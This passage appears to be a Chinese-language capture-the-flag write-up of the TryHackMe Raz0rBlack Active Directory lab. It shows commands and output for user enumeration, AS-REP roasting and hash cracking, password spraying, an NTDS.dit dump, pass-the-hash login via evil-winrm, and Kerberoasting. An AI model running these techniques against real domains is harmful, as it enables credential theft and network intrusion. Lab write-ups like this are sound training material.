<h4 id="ASREProast"><a href="#ASREProast" class="headerlink" title="ASREProast:"></a>ASREProast:</h4><p>然后可以先枚举一下存在的用户：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$kerbrute</span> userenum users.txt --dc 10.10.104.184 -d raz0rblack -o user.txt</span><br><span class="line"></span><br><span class="line">    __             __               __     </span><br><span class="line">   / /_____  _____/ /_  _______  __/ /____ </span><br><span class="line">  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \</span><br><span class="line"> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/</span><br><span class="line">/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        </span><br><span class="line"></span><br><span class="line">Version: v1.0.3 (9dad6e1) - 06/26/22 - Ronnie Flathers @ropnop</span><br><span class="line"></span><br><span class="line">2022/06/26 03:54:09 &gt;  Using KDC(s):</span><br><span class="line">2022/06/26 03:54:09 &gt;  	10.10.104.184:88</span><br><span class="line"></span><br><span class="line">2022/06/26 03:54:13 &gt;  [+] VALID USERNAME:	 lvetrova@raz0rblack</span><br><span class="line">2022/06/26 03:54:13 &gt;  [+] VALID USERNAME:	 twilliams@raz0rblack</span><br><span class="line">2022/06/26 03:54:14 &gt;  [+] VALID USERNAME:	 sbradley@raz0rblack</span><br><span class="line">2022/06/26 03:54:15 &gt;  Done! Tested 132 usernames (3 valid) <span class="keyword">in</span> 5.716 seconds</span><br><span class="line"></span><br><span class="line"><span class="variable">$cat</span> user.txt | grep VALID | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> &gt; newuser</span><br><span class="line"><span class="variable">$cat</span> newuser </span><br><span class="line">lvetrova@raz0rblack</span><br><span class="line">twilliams@raz0rblack</span><br><span class="line">sbradley@raz0rblack</span><br></pre></td></tr></table></figure>

<p>然后枚举禁用预认证用户：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$GetNPUsers</span>.py <span class="string">&#x27;raz0rblack/&#x27;</span> -usersfile newuser -request -format hashcat -no-pass -dc-ip 10.10.104.184 -outputfile ASREProastables.txt</span><br><span class="line">Impacket v0.10.1.dev1+20220606.123812.ac35841f - Copyright 2022 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[-] User lvetrova@raz0rblack doesn<span class="string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span></span><br><span class="line"><span class="string">[-] User sbradley@raz0rblack doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="built_in">set</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$cat</span> ASREProastables.txt </span><br><span class="line">$krb5asrep$23<span class="variable">$twilliams</span>@raz0rblack@RAZ0RBLACK:71e4f9759482a6fbc65c6dc0cb733ad2<span class="variable">$8900392465311f4c0a7a894954c0ed1cb47d0396ae3734c1b3871576e5bf198f72343f68123ef18bcd879502f4094051a2ac6bc4d8e17e2605ed34946df5ea5ff2f7a8bb567505e469c43495494608a8ecf6768eb43f8621ba5c506d473ad7d1ed2f93768210bc6520694c041dde4e85b6bc308de3c9d47007de1c1476747f4091c3ea2037d71b30dd7980ca8cff9f62e182f9c3454dc901c1d659ddf165d7c603098e93c0d0a1b9c12f6bf8e3500a04b74740fe7e6bbf6f161aa55c950cad22d89857a43301c04fb948524c8c9d278d5456b1e3ec30d6e5003d5ea395f5079f8ea54ee738e3483483022eaa</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$hashcat</span> -m 18200 ASREProastables.txt /usr/share/wordlists/rockyou.txt</span><br><span class="line"></span><br><span class="line">Host memory required <span class="keyword">for</span> this attack: 204 MB</span><br><span class="line"></span><br><span class="line">Dictionary cache hit:</span><br><span class="line">* Filename..: /usr/share/wordlists/rockyou.txt</span><br><span class="line">* Passwords.: 14344385</span><br><span class="line">* Bytes.....: 139921507</span><br><span class="line">* Keyspace..: 14344385</span><br><span class="line"></span><br><span class="line">$krb5asrep$23<span class="variable">$twilliams</span>@raz0rblack@RAZ0RBLACK:71e4f9759482a6fbc65c6dc0cb733ad2<span class="variable">$8900392465311f4c0a7a894954c0ed1cb47d0396ae3734c1b3871576e5bf198f72343f68123ef18bcd879502f4094051a2ac6bc4d8e17e2605ed34946df5ea5ff2f7a8bb567505e469c43495494608a8ecf6768eb43f8621ba5c506d473ad7d1ed2f93768210bc6520694c041dde4e85b6bc308de3c9d47007de1c1476747f4091c3ea2037d71b30dd7980ca8cff9f62e182f9c3454dc901c1d659ddf165d7c603098e93c0d0a1b9c12f6bf8e3500a04b74740fe7e6bbf6f161aa55c950cad22d89857a43301c04fb948524c8c9d278d5456b1e3ec30d6e5003d5ea395f5079f8ea54ee738e3483483022eaa</span>:roastpotatoes</span><br><span class="line"></span><br><span class="line"><span class="variable">$echo</span> roastpotatoes &gt; passwd</span><br><span class="line"><span class="variable">$echo</span> twilliams &gt; user.txt</span><br></pre></td></tr></table></figure>

<p>然后可以看一看共享，当然也可以尝试直接走winrm登录上去。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$smbmap</span> -H 10.10.104.184 -u twilliams -p roastpotatoes</span><br><span class="line">[+] IP: 10.10.104.184:445	Name: 10.10.104.184                                      </span><br><span class="line">        Disk                                                  	Permissions	Comment</span><br><span class="line">	----                                                  	-----------	-------</span><br><span class="line">	ADMIN$                                            	NO ACCESS	Remote Admin</span><br><span class="line">	C$                                                	NO ACCESS	Default share</span><br><span class="line">	IPC$                                              	READ ONLY	Remote IPC</span><br><span class="line">	NETLOGON                                          	READ ONLY	Logon server share </span><br><span class="line">	SYSVOL                                            	READ ONLY	Logon server share </span><br><span class="line">	trash                                             	NO ACCESS	Files Pending <span class="keyword">for</span> deletio</span><br></pre></td></tr></table></figure>

<p>看起来没什么东西，可以尝试走rpcclient获取更多用户名，不过也没有更多：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$rpcclient</span> -U twilliams 10.10.104.184 -c <span class="string">&#x27;enumdomusers&#x27;</span> &gt; user.txt</span><br><span class="line"><span class="variable">$cat</span> user.txt | grep user | awk -F <span class="string">&#x27;[&#x27;</span> <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>| awk -F <span class="string">&#x27;]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> &gt; users.txt</span><br><span class="line"><span class="variable">$cat</span> users.txt </span><br><span class="line">Administrator</span><br><span class="line">Guest</span><br><span class="line">krbtgt</span><br><span class="line">xyan1d3</span><br><span class="line">lvetrova</span><br><span class="line">sbradley</span><br><span class="line">twilliams</span><br></pre></td></tr></table></figure>

<p>SMB中没有什么有用的东西，那么现在其实试试bloodhound去枚举LDAP：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$bloodhound</span>-python -u twilliams -p roastpotatoes -d raz0rblack.thm -ns 10.10.104.184 --zip -c All</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220626050219563.png" srcset="/img/loading.gif" lazyload alt="image-20220626050219563"></p>
<p>信息太少，winrm被禁止远程登录,而445因为没有权限访问命名管道失败也理所应当：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$psexec</span>.py twilliams@10.10.104.184</span><br><span class="line">Impacket v0.10.1.dev1+20220606.123812.ac35841f - Copyright 2022 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">[*] Requesting shares on 10.10.104.184.....</span><br><span class="line">[-] share <span class="string">&#x27;ADMIN$&#x27;</span> is not writable.</span><br><span class="line">[-] share <span class="string">&#x27;C$&#x27;</span> is not writable.</span><br><span class="line">[-] share <span class="string">&#x27;NETLOGON&#x27;</span> is not writable.</span><br><span class="line">[-] share <span class="string">&#x27;SYSVOL&#x27;</span> is not writable.</span><br><span class="line">[-] share <span class="string">&#x27;trash&#x27;</span> is not writable.</span><br></pre></td></tr></table></figure>

<p>那我现在一堆用户名一个密码，尝试密码喷涂吧。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$crackmapexec</span> smb 10.10.104.184 -u users.txt -p passwd --continue-on-success</span><br><span class="line">/usr/lib/python3/dist-packages/paramiko/transport.py:219: CryptographyDeprecationWarning: Blowfish has been deprecated</span><br><span class="line">  <span class="string">&quot;class&quot;</span>: algorithms.Blowfish,</span><br><span class="line">SMB         10.10.104.184     445    HAVEN-DC         [*] Windows 10.0 Build 17763 x64 (name:HAVEN-DC) (domain:raz0rblack.thm) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.104.184     445    HAVEN-DC         [-] raz0rblack.thm\Administrator:roastpotatoes STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.104.184     445    HAVEN-DC         [-] raz0rblack.thm\Guest:roastpotatoes STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.104.184     445    HAVEN-DC         [-] raz0rblack.thm\krbtgt:roastpotatoes STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.104.184     445    HAVEN-DC         [-] raz0rblack.thm\xyan1d3:roastpotatoes STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.104.184     445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:roastpotatoes STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.104.184     445    HAVEN-DC         [-] raz0rblack.thm\sbradley:roastpotatoes STATUS_PASSWORD_MUST_CHANGE </span><br><span class="line">SMB         10.10.104.184     445    HAVEN-DC         [+] raz0rblack.thm\twilliams:roastpotatoes</span><br></pre></td></tr></table></figure>

<p>sbradley用户的提示信息不一样，说必须更改密码。或许是密码已过期？可以尝试更改,为了省事，我还是将其设置为了roastpotatoes：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$smbpasswd</span> -r 10.10.104.184 -U sbradley</span><br><span class="line">Old SMB password:roastpotatoes</span><br><span class="line">New SMB password:roastpotatoes</span><br><span class="line">Retype new SMB password:roastpotatoes</span><br><span class="line">Password changed <span class="keyword">for</span> user sbradley</span><br><span class="line"></span><br><span class="line"><span class="variable">$smbmap</span> -H 10.10.104.184 -u sbradley -p roastpotatoes</span><br><span class="line">[+] IP: 10.10.104.184:445	Name: 10.10.104.184                                       </span><br><span class="line">        Disk                                                  	Permissions	Comment</span><br><span class="line">	----                                                  	-----------	-------</span><br><span class="line">	ADMIN$                                            	NO ACCESS	Remote Admin</span><br><span class="line">	C$                                                	NO ACCESS	Default share</span><br><span class="line">	IPC$                                              	READ ONLY	Remote IPC</span><br><span class="line">	NETLOGON                                          	READ ONLY	Logon server share </span><br><span class="line">	SYSVOL                                            	READ ONLY	Logon server share </span><br><span class="line">	trash                                             	READ ONLY	Files Pending <span class="keyword">for</span> deletion</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$smbclient</span> //10.10.104.184/trash -U sbradley</span><br><span class="line">Enter WORKGROUP\sbradley<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Try &quot;help&quot; to get a list of possible commands.</span></span><br><span class="line"><span class="string">smb: \&gt; ls</span></span><br><span class="line"><span class="string">  .                                   D        0  Tue Mar 16 14:01:28 2021</span></span><br><span class="line"><span class="string">  ..                                  D        0  Tue Mar 16 14:01:28 2021</span></span><br><span class="line"><span class="string">  chat_log_20210222143423.txt         A     1340  Fri Feb 26 03:29:05 2021</span></span><br><span class="line"><span class="string">  experiment_gone_wrong.zip           A 18927164  Tue Mar 16 14:02:20 2021</span></span><br><span class="line"><span class="string">  sbradley.txt                        A       37  Sun Feb 28 03:24:21 2021</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">smb: \&gt; mget *</span></span><br></pre></td></tr></table></figure>

<p>解压文件需要密码：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$zip2john</span> experiment_gone_wrong.zip &gt; hash.txt</span><br><span class="line"><span class="variable">$john</span> hash.txt -w=/usr/share/wordlists/rockyou.txt</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (PKZIP [32/64])</span><br><span class="line">Will run 2 OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">electromagnetismo (experiment_gone_wrong.zip)</span><br><span class="line">1g 0:00:00:06 DONE (2022-06-25 22:33) 0.1545g/s 1294Kp/s 1294Kc/s 1294KC/s elephantman31..eldon1986</span><br><span class="line">Use the <span class="string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br><span class="line"></span><br><span class="line"><span class="variable">$unzip</span> experiment_gone_wrong.zip </span><br><span class="line">Archive:  experiment_gone_wrong.zip</span><br><span class="line">[experiment_gone_wrong.zip] system.hive password: </span><br><span class="line">  inflating: system.hive             </span><br><span class="line">  inflating: ntds.dit</span><br><span class="line">  </span><br><span class="line"><span class="variable">$secretsdump</span>.py -ntds ./ntds.dit -system ./system.hive LOCAL &gt; user.hash</span><br><span class="line"><span class="variable">$cat</span> user.hash</span><br><span class="line"></span><br><span class="line">[*] Target system bootKey: 0x17a0a12951d502bb3c14cf1d495a71ad</span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Searching <span class="keyword">for</span> pekList, be patient</span><br><span class="line">[*] PEK <span class="comment"># 0 found and decrypted: 84bf0a79cd645db4f94b24c35cfdf7c7</span></span><br><span class="line">[*] Reading and decrypting hashes from ./ntds.dit </span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:1afedc472d0fdfe07cd075d36804efd0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">HAVEN-DC$:1000:aad3b435b51404eeaad3b435b51404ee:4ea59b8f64c94ec66ddcfc4e6e5899f9:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:703a365974d7c3eeb80e11dd27fb0cb3:::</span><br><span class="line">&lt;skip&gt;</span><br></pre></td></tr></table></figure>

<p>但管理员的并不能被用来进行登录。对哈希稍加处理进行密码喷涂：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 10.10.104.184 -u users.txt -H user.hash </span><br><span class="line">SMB         10.10.104.184   445    HAVEN-DC         [-] raz0rblack.thm\Administrator:f220d3988deb3f516c73f40ee16c431d STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.104.184   445    HAVEN-DC         [-] raz0rblack.thm\Guest:f220d3988deb3f516c73f40ee16c431d STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.104.184   445    HAVEN-DC         [-] raz0rblack.thm\krbtgt:f220d3988deb3f516c73f40ee16c431d STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.104.184   445    HAVEN-DC         [-] raz0rblack.thm\xyan1d3:f220d3988deb3f516c73f40ee16c431d STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.104.184   445    HAVEN-DC         [+] raz0rblack.thm\lvetrova f220d3988deb3f516c73f40ee16c431d </span><br></pre></td></tr></table></figure>

<p>可以看到有一条是成功了的。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$evil</span>-winrm -i 10.10.104.184 -u lvetrova -H f220d3988deb3f516c73f40ee16c431d</span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v3.4</span><br><span class="line"></span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine</span><br><span class="line"></span><br><span class="line">Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm<span class="comment">#Remote-path-completion</span></span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\lvetrova\Documents&gt;</span><br></pre></td></tr></table></figure>

<p>目录下边有一个xml文件：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\<span class="built_in">users</span>\lvetrova&gt; <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\<span class="built_in">users</span>\lvetrova</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">d-r---        9/15/2018  12:19 AM                Desktop</span><br><span class="line">d-r---        2/25/2021  10:14 AM                Documents</span><br><span class="line">d-r---        9/15/2018  12:19 AM                Downloads</span><br><span class="line">d-r---        9/15/2018  12:19 AM                Favorites</span><br><span class="line">d-r---        9/15/2018  12:19 AM                Links</span><br><span class="line">d-r---        9/15/2018  12:19 AM                Music</span><br><span class="line">d-r---        9/15/2018  12:19 AM                Pictures</span><br><span class="line">d-----        9/15/2018  12:19 AM                Saved Games</span><br><span class="line">d-r---        9/15/2018  12:19 AM                Videos</span><br><span class="line">-a----        2/25/2021  10:16 AM           1692 lvetrova.xml</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\<span class="built_in">users</span>\lvetrova&gt; <span class="built_in">cat</span> lvetrova.xml</span><br><span class="line">&lt;Objs Version=<span class="string">&quot;1.1.0.1&quot;</span> xmlns=<span class="string">&quot;http://schemas.microsoft.com/powershell/2004/04&quot;</span>&gt;</span><br><span class="line">  &lt;Obj RefId=<span class="string">&quot;0&quot;</span>&gt;</span><br><span class="line">    &lt;TN RefId=<span class="string">&quot;0&quot;</span>&gt;</span><br><span class="line">      &lt;T&gt;System.Management.Automation.PSCredential&lt;/T&gt;</span><br><span class="line">      &lt;T&gt;System.Object&lt;/T&gt;</span><br><span class="line">    &lt;/TN&gt;</span><br><span class="line">    &lt;ToString&gt;System.Management.Automation.PSCredential&lt;/ToString&gt;</span><br><span class="line">    &lt;Props&gt;</span><br><span class="line">      &lt;S N=<span class="string">&quot;UserName&quot;</span>&gt;Your Flag is here =&amp;gt;&lt;/S&gt;</span><br><span class="line">      &lt;SS N=<span class="string">&quot;Password&quot;</span>&gt;01000000d08c9ddf0115d1118c7a00c04fc297eb010000009db56a0543f441469fc81aadb02945d20000000002000000000003660000c000000010000000069a026f82c590fa867556fe4495ca870000000004800000a0000000100000003b5bf64299ad06afde3fc9d6efe72d35500000002828ad79f53f3f38ceb3d8a8c41179a54dc94cab7b17ba52d0b9fc62dfd4a205f2bba2688e8e67e5cbc6d6584496d107b4307469b95eb3fdfd855abe27334a5fe32a8b35a3a0b6424081e14dc387902414000000e6e36273726b3c093bbbb4e976392a874772576d&lt;/SS&gt;</span><br><span class="line">    &lt;/Props&gt;</span><br><span class="line">  &lt;/Obj&gt;</span><br><span class="line">&lt;/Objs&gt;</span><br><span class="line">*Evil-WinRM* PS C:\<span class="built_in">users</span>\lvetrova&gt; <span class="variable">$cred</span> = Import-CliXml -Path lvetrova.xml</span><br><span class="line">*Evil-WinRM* PS C:\<span class="built_in">users</span>\lvetrova&gt; <span class="variable">$cred</span>.GetNetworkCredential() | Format-List *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">UserName       : Your Flag is here =&gt;</span><br><span class="line">Password       : THM&#123;694...................................&#125;</span><br><span class="line">SecurePassword : System.Security.SecureString</span><br><span class="line">Domain         :</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\<span class="built_in">users</span>\lvetrova&gt; </span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$bloodhound</span>-python -u lvetrova --hashes f220d3988deb3f516c73f40ee16c431d:f220d3988deb3f516c73f40ee16c431d -d raz0rblack.thm -ns 10.10.104.184 --zip -c All</span><br><span class="line">INFO: Found AD domain: raz0rblack.thm</span><br><span class="line">INFO: Connecting to LDAP server: haven-dc.raz0rblack.thm</span><br><span class="line">INFO: Found 1 domains</span><br><span class="line">INFO: Found 1 domains <span class="keyword">in</span> the forest</span><br><span class="line">INFO: Found 1 computers</span><br><span class="line">INFO: Connecting to LDAP server: haven-dc.raz0rblack.thm</span><br><span class="line">INFO: Found 8 <span class="built_in">users</span></span><br><span class="line">INFO: Found 52 <span class="built_in">groups</span></span><br><span class="line">INFO: Found 0 trusts</span><br><span class="line">INFO: Starting computer enumeration with 10 workers</span><br><span class="line">INFO: Querying computer: HAVEN-DC.raz0rblack.thm</span><br><span class="line">INFO: Done <span class="keyword">in</span> 01M 05S</span><br><span class="line">INFO: Compressing output into 20220626134344_bloodhound.zip</span><br></pre></td></tr></table></figure>

<p>没什么新东西。看一下另一个神秘的用户：</p>
<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220626135400440.png" srcset="/img/loading.gif" lazyload alt="image-20220626135400440"></p>
<p>备份组的成员。当前情况如果我想得到这个用户，要么找系统漏洞，要么找委派账户或者域内服务账号。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\<span class="built_in">users</span>\lvetrova&gt; net user</span><br><span class="line"></span><br><span class="line">User accounts <span class="keyword">for</span> \\</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            Guest                    krbtgt</span><br><span class="line">lvetrova                 sbradley                 twilliams</span><br><span class="line">xyan1d3</span><br><span class="line">The <span class="built_in">command</span> completed with one or more errors.</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\<span class="built_in">users</span>\lvetrova&gt; </span><br></pre></td></tr></table></figure>

<p>没有服务账户。</p>
<h4 id="Kerberoasting："><a href="#Kerberoasting：" class="headerlink" title="Kerberoasting："></a>Kerberoasting：</h4><p>其实可以用当前用户去申请一下ST票据，看能否获取一下设置了SPN账户的票据：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$GetUserSPNs</span>.py raz0rblack.thm/lvetrova -hashes f220d3988deb3f516c73f40ee16c431d:f220d3988deb3f516c73f40ee16c431d -outputfile kerberoastables.txt -dc-ip 10.10.104.184</span><br><span class="line">Impacket v0.10.1.dev1+20220606.123812.ac35841f - Copyright 2022 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">ServicePrincipalName                   Name     MemberOf                                                    PasswordLastSet             LastLogon  Delegation </span><br><span class="line">-------------------------------------  -------  ----------------------------------------------------------  --------------------------  ---------  ----------</span><br><span class="line">HAVEN-DC/xyan1d3.raz0rblack.thm:60111  xyan1d3  CN=Remote Management Users,CN=Builtin,DC=raz0rblack,DC=thm  2021-02-23 23:17:17.715160  &lt;never&gt;   </span><br><span class="line"></span><br><span class="line"><span class="variable">$cat</span> kerberoastables.txt </span><br><span class="line">$krb5tgs$23$*xyan1d3<span class="variable">$RAZ0RBLACK</span>.THM<span class="variable">$raz0rblack</span>.thm/xyan1d3*$1a5564b34ebfedb209a82d03599d840a<span 